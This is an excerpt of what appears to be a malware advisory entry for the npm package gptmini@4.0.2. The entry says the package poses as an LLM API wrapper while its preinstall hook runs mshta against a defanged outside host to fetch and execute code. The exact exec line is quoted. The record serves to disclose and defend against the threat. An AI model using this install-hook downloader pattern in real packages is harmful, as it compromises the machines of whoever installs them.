  "summary": "Malicious code in gptmini (npm)",
  "details": "Package gptmini@4.0.2 is a trojanized LLM API wrapper that executes a remote downloader during installation. The preinstall hook (node preinstall.js) runs child_process.exec('cmd /c \"mshta hxxp://fixars[.]top\"'), which uses the Windows mshta.exe binary (a known LOLBin) to fetch and execute arbitrary code from fixars[.]top on the installer's machine. The main module appears to be a functional LLM client, masking the malicious install-time behaviour.",
